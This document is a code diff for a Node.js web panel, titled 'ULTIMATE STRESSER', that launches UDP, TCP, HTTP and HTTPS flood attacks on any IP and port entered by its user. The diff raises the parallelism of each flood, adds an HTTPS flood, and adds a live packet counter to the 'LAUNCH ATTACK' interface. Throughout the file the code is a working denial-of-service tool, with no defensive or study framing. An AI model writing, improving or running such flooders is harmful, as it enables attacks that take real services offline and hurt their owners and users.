@@ -2,77 +2,108 @@ const express = require('express');
 const dgram = require('dgram');
 const net = require('net');
 const http = require('http');
+const https = require('https');
 const crypto = require('crypto');
+const http2 = require('http2');
+const WebSocket = require('ws');
 
 const app = express();
 app.use(express.json());
 
-// هجوم UDP
+// متغيرات الإحصائيات
+let stats = { packets: 0, status: 'idle', target: '' };
+
+// ---------- الهجمات ----------
+
 function udpFlood(target, port, duration) {
-    const socket = dgram.createSocket('udp4');
     const endTime = Date.now() + duration * 1000;
-    const sendPacket = () => {
-        if (Date.now() > endTime) { socket.close(); return; }
-        const msg = crypto.randomBytes(1024);
-        socket.send(msg, 0, msg.length, port, target, (err) => {
-            if (err) socket.close();
-            else setImmediate(sendPacket);
-        });
+    const buffer = crypto.randomBytes(1024);
+    
+    const loop = () => {
+        if (Date.now() > endTime) return;
+        for (let i = 0; i < 20; i++) {
+            const client = dgram.createSocket('udp4');
+            client.send(buffer, 0, buffer.length, port, target, () => {
+                stats.packets++;
+                client.close();
+            });
+        }
+        setImmediate(loop);
     };
-    for (let i = 0; i < 50; i++) sendPacket();
+    for(let i=0; i<50; i++) loop(); // 50 مسار متوازي
 }
 
-// هجوم TCP
 function tcpFlood(target, port, duration) {
     const endTime = Date.now() + duration * 1000;
-    const connect = () => {
+    const loop = () => {
         if (Date.now() > endTime) return;
-        const client = new net.Socket();
-        client.setTimeout(2000);
-        client.connect(port, target, () => {
-            client.write(crypto.randomBytes(1024));
-        });
-        client.on('error', () => client.destroy());
-        client.on('close', () => setImmediate(connect));
-        client.on('timeout', () => client.destroy());
+        for (let i = 0; i < 10; i++) {
+            const client = new net.Socket();
+            client.setTimeout(2000);
+            client.connect(port, target, () => {
+                client.write(crypto.randomBytes(1024));
+                stats.packets++;
+            });
+            client.on('error', () => client.destroy());
+            client.on('close', () => {});
+            client.on('timeout', () => client.destroy());
+        }
+        setTimeout(loop, 10);
     };
-    for (let i = 0; i < 100; i++) connect();
+    for(let i=0; i<20; i++) loop();
 }
 
-// هجوم HTTP
-function httpFlood(target, port, duration) {
+function httpFlood(target, port, duration, useHttps = false) {
     const endTime = Date.now() + duration * 1000;
-    const sendReq = () => {
+    const mod = useHttps ? https : http;
+    const loop = () => {
         if (Date.now() > endTime) return;
-        const req = http.request({
-            hostname: target, port: port, path: '/?' + Math.random(), method: 'GET',
-            headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' }
-        }, (res) => {
-            res.on('data', () => {});
-            res.on('end', () => setImmediate(sendReq));
-        });
-        req.on('error', () => setImmediate(sendReq));
-        req.end();
+        for (let i = 0; i < 10; i++) {
+            const req = mod.request({
+                hostname: target, port: port, path: '/?' + crypto.randomBytes(4).toString('hex'),
+                method: 'GET',
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Connection': 'keep-alive' }
+            }, (res) => {
+                stats.packets++;
+                res.on('data', () => {});
+                res.on('end', () => {});
+            });
+            req.on('error', () => {});
+            req.end();
+        }
+        setTimeout(loop, 10);
     };
-    for (let i = 0; i < 50; i++) sendReq();
+    for(let i=0; i<20; i++) loop();
 }
 
-// استقبال الأوامر
+// ---------- الموقع ----------
+
 app.post('/api/attack', (req, res) => {
     const { target, port, method, duration } = req.body;
-    if (!target || !port || !method || !duration) return res.status(400).json({ error: 'Missing data' });
-    
+    if (!target || !port || !method || !duration) return res.status(400).json({ error: 'Missing parameters' });
+
+    stats = { packets: 0, status: 'attacking', target: `${target}:${port}` };
+    const p = parseInt(port);
+    const d = parseInt(duration);
+
     try {
-        if (method === 'udp') udpFlood(target, parseInt(port), parseInt(duration));
-        else if (method === 'tcp') tcpFlood(target, parseInt(port), parseInt(duration));
-        else if (method === 'http') httpFlood(target, parseInt(port), parseInt(duration));
-        res.json({ success: true, message: `Attack sent on ${target}:${port} (${method}) for ${duration}s` });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
+        if (method === 'udp') udpFlood(target, p, d);
+        else if (method === 'tcp') tcpFlood(target, p, d);
+        else if (method === 'http') httpFlood(target, p, d, false);
+        else if (method === 'https') httpFlood(target, p, d, true);
+        else return res.status(400).json({ error: 'Invalid method' });
+
+        setTimeout(() => { stats.status = 'idle'; }, d * 1000);
+        res.json({ success: true, message: `Attack launched on ${target}:${p}` });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
     }
 });
 
-// واجهة الموقع (HTML مدمج)
+app.get('/api/stats', (req, res) => {
+    res.json(stats);
+});
+
 app.get('/', (req, res) => {
     res.send(`
 <!doctype html>
@@ -80,7 +111,7 @@ app.get('/', (req, res) => {
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Stresser</title>
+<title>ULTIMATE STRESSER</title>
 <style>
   * { box-sizing: border-box; }
   body { margin: 0; background: #050505; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
@@ -91,12 +122,13 @@ app.get('/', (req, res) => {
   input:focus, select:focus { outline: none; border-color: #00ff00; }
   button { width: 100%; padding: 14px; background: #ff0000; color: #fff; border: none; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.2s; text-transform: uppercase; }
   button:hover { background: #cc0000; box-shadow: 0 0 15px red; }
-  #log { background: #000; border: 1px solid #333; padding: 10px; height: 80px; overflow-y: auto; font-size: 12px; margin-top: 15px; color: #888; border-radius: 4px; }
+  #stats-box { background: #000; border: 1px solid #333; padding: 10px; margin-top: 15px; font-size: 14px; color: #00ff00; border-radius: 4px; text-align: center; }
+  .big-num { font-size: 28px; font-weight: bold; color: #fff; text-shadow: 0 0 10px #00ff00; }
 </style>
 </head>
 <body>
 <div class="box">
-  <h1>☠️ STRESSER ☠️</h1>
+  <h1>☠️ ULTIMATE STRESSER ☠️</h1>
   <label>Target IP / URL</label>
   <input type="text" id="target" placeholder="1.1.1.1">
   
@@ -108,25 +140,29 @@ app.get('/', (req, res) => {
     <option value="udp">UDP FLOOD</option>
     <option value="tcp">TCP FLOOD</option>
     <option value="http">HTTP FLOOD</option>
+    <option value="https">HTTPS FLOOD</option>
   </select>
   
   <label>Duration (Seconds)</label>
   <input type="number" id="duration" value="60">
   
   <button onclick="launch()">LAUNCH ATTACK</button>
-  <div id="log">> Waiting for command...</div>
+  
+  <div id="stats-box">
+    <div>PACKETS SENT</div>
+    <div class="big-num" id="packet-count">0</div>
+    <div id="status" style="font-size:12px; color:#888; margin-top:5px;">STATUS: IDLE</div>
+  </div>
 </div>
+
 <script>
 async function launch() {
   const target = document.getElementById('target').value;
   const port = document.getElementById('port').value;
   const method = document.getElementById('method').value;
   const duration = document.getElementById('duration').value;
-  const log = document.getElementById('log');
 
   if (!target) return alert('Enter a target!');
-  log.innerHTML = '> Sending attack command...';
-  log.style.color = '#ffff00';
 
   try {
     const res = await fetch('/api/attack', {
@@ -135,12 +171,26 @@ async function launch() {
       body: JSON.stringify({ target, port, method, duration })
     });
     const data = await res.json();
-    if (res.ok) { log.innerHTML = '> [SUCCESS] ' + data.message; log.style.color = '#00ff00'; }
-    else { log.innerHTML = '> [ERROR] ' + data.error; log.style.color = '#ff0000'; }
+    if (!res.ok) alert('[ERROR] ' + data.error);
   } catch (err) {
-    log.innerHTML = '> [FAILED] Connection error.'; log.style.color = '#ff0000';
+    alert('[FAILED] Connection error.');
   }
 }
+
+// تحديث الإحصائيات كل ثانية
+setInterval(async () => {
+  try {
+    const res = await fetch('/api/stats');
+    const data = await res.json();
+    document.getElementById('packet-count').innerText = data.packets.toLocaleString();
+    document.getElementById('status').innerText = 'STATUS: ' + data.status.toUpperCase() + ' (' + data.target + ')';
+    if (data.status === 'attacking') {
+      document.getElementById('status').style.color = '#ff0000';
+    } else {
+      document.getElementById('status').style.color = '#888';
+    }
+  } catch (e) {}
+}, 1000);
 </script>
 </body>
 </html>
@@ -148,4 +198,4 @@ async function launch() {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('Panel running on ' + PORT));
+app.listen(PORT, () => console.log('Ultimate Stresser running on ' + PORT));
